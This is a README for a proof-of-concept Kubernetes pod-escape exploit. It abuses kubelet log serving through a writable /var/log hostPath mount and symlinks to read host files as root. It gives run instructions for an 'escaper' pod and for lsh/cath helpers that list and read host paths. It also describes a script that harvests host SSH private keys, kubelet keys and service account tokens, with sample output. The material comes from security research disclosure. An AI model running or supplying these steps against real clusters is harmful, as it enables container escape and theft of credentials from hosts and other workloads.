# Kubelet Exploit For /var/log Mount

Kube-pod-escape is a POC for an exploit on the symlink following behaviour of logs files serving in the kubelet, in addition with a pod that has a write hostPath mount to /var/log.  
This POC shows the outcome of a pod which uses that mount, and how it can escape to the host machine.  
Further read on this discovery can be done on the following [blog post](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

[![asciicast](https://asciinema.org/a/260371.svg)](https://asciinema.org/a/260371?speed=2)
This repository contains all files and related code for running this exploit.  


## Prerequisites
A Kubernetes cluster, 
Without restriction for retrieving logs with `kubectl logs <pod>`


## Run the exploit

First, create the pod by:
    
```bash
$ kubectl create -f escaper.yml
pod "escaper" created
```

After the pod was created, exec into the escaper pod.
```bash
$ kubectl exec -it escaper bash
➜ root@escaper:~/exploit$ lsh
Usage: [cath|lsh] <host_path>
```
### lsh
Works like ls, but using root access on the host machine.
### cath
Works like cat, but using root access on the host machine.

Example:
```bash
$ kubectl exec -it escaper bash
➜ root@escaper:~/exploit$ lsh /proc
1/
10/
10034/
10042/
10047/
....
```

## Extract Sensitive Data
In addition to the given lsh and cath commands, Inside the `~/exploit` folder, there's a python script, which automatically locates and downloads private key files from the host, as well as kubernetes service account tokens.  
_(to find tokens, the script searches the /var/lib/kubelet/pods folder. this way it can read the mounted .token files for each pod that runs on the host)_

## Run the script
```bash
$ kubectl exec -it escaper bash
➜ root@escaper:~/exploit$ python find_sensitive_files.py
[*] Got access to kubelet /logs endpoint
[+] creating symlink to host root folder inside /var/log

[*] fetching token files from host
[+] extracted hostfile: /var/lib/kubelet/pods/6d67bed2-abe3-11e9-9888-42010a8e020e/volumes/kubernetes.io~secret/metadata-agent-token-xjfh9/token

[*] fetching private key files from host
[+] extracted hostfile: /home/ubuntu/.ssh/private.key
[+] extracted hostfile: /etc/srv/kubernetes/pki/kubelet.key
...
```
Token Files are downloaded to: `/root/exploit/host_files/tokens`  
Key Files are downloaded to: `/root/exploit/host_files/private_keys`

